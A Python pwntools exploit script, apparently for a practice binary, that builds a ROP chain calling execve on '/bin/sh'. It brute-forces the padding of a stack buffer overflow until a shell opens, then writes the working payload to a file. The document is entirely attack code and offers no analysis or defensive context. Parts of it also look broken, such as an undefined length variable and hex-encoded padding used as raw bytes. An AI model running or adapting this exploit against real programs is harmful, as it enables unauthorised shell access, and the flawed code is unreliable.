#!/usr/bin/env python
import string
import random
import traceback
from pwn import *
context.clear(arch='amd64', kernel='amd64')

def randomString():
    return ''.join(random.SystemRandom().choice(string.ascii_uppercase +
                string.digits) for _ in range(N))

class Payload(object):
    '''
    Figures out how to pad the ROP so that the first jump lands on the first
    available ret
    '''
    def __init__(self, rop):
        self.rop = rop
        self.reset()
        self.ropStr = str(rop)

    def  __str__(self):
        payloadStr = ''
        # This needs to be improved, these were found with gdb and represent the
        # address of the buffer and the return address we want to overwrite. We need to
        # calculate the offset and place that many 'a's in front of our ROP payload so
        # that when we write the whole thing into the buffer the first part of the ROP
        # we just generated will be popped into %rip
        for i in xrange(0, self.padCount):
            payloadStr += self.nop
        # Next time we try again with more padding
        self.padCount += 1
        # Return with rop appended
        self.asString = payloadStr + self.ropStr
        return self.asString

    def reset(self):
        self.asString = ''
        self.ropStr = ''
        self.padCount = 0
        self.nop = pwnlib.asm.asm('nop').encode('hex')

    def toFile(self, filename=False):
        if filename is False:
            filename = randomString()
        # Save exploit code
        with open(filename, 'wb') as pFile:
            pFile.write(self.asString)
        return filename

def main():

    # Open the vulnerable binary
    binary   = ELF('./main')

    # Let's build our ROP stack
    rop   = ROP(binary)
    # The location of the variable `binsh` which contains the "/bin/sh" string
    binsh = binary.symbols['binsh']
    # Execve to get us a shell, passing in no arguments or env vars
    rop.execve(binsh, 0, 0)
    # Print it out because its fun to see
    print rop.dump()

    # Create our payload
    payload = Payload(rop)

    # If at first you dont succeed try and try again
    popShell = False
    while popShell is False:
        try:
            payloadString = str(payload)
            p = process(binary.path)
            p.send(payloadString)
            msg = 'Popped a shell'
            p.sendline('echo {}; exit'.format(msg))
            rsp = p.recvline()
            print(rsp[:-1])
            payload.toFile('payload')
            break
        except Exception as e:
            print(str(e))
            # traceback.print_exc()

if __name__ == '__main__':
    main()
